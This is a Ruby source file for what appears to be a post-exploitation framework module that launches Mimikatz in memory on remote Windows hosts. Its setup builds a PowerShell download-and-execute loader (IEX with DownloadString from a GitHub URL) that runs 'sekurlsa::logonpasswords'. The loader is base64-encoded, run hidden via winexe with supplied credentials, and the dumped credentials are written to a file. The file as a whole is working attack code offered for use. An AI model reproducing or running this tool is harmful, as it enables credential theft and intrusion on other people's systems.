require 'poet'
require 'base64'

class Mimikatz_PS < Poet::Scanner
  self.mod_name = "Mimikatz (PowerShell)"
  self.description = "Execute Mimikatz in memory on target(s) using PowerShell."
  self.invasive = true
  self.title = 'Mimikatz In-Memory Launcher'

  def setup
    @mimikatz_url = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1"
    print_status("This module will download and execute Invoke-Mimikatz from GitHub.")
    print_status("Target(s) must have internet access or you must provide a local URL.")
    
    print "Enter Invoke-Mimikatz URL [#{color_banner(@mimikatz_url)}] : "
    user_url = rgets
    @mimikatz_url = user_url unless user_url.empty?

    @command = "Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords exit'"
    print "Enter Mimikatz Command [#{color_banner(@command)}] : "
    user_command = rgets
    @command = user_command unless user_command.empty?

    # Create the loader script
    @loader = "IEX (New-Object Net.WebClient).DownloadString('#{@mimikatz_url}'); #{@command}"
    @encoded_ps = @loader.to_ps_base64!
    
    @results = Hash.new
  end

  def run(username, password, host)
    ps_args = "powershell -noprofile -windowstyle hidden -noninteractive -EncodedCommand #{@encoded_ps}"
    vprint_status("#{host.ljust(15)} - Executing Mimikatz...")
    result = winexe("//#{host}", ps_args)
    @results[host] = result
    print_good("#{host.ljust(15)} - Mimikatz execution completed")
  end

  def finish
    final_output = ''
    @results.each_pair do |key, value|
      final_output << "Host: #{key}\n#{'='*20}\n#{value}\n\n"
    end
    
    filename = "mimikatz_#{Time.now.strftime('%Y%m%d_%H%M%S')}.txt"
    write_file(final_output, filename)
    print_status("Results saved to: #{Menu.opts[:log]}/#{filename}")
    
    puts "\nPress enter to return to Exploitation Menu"
    gets
  end
end
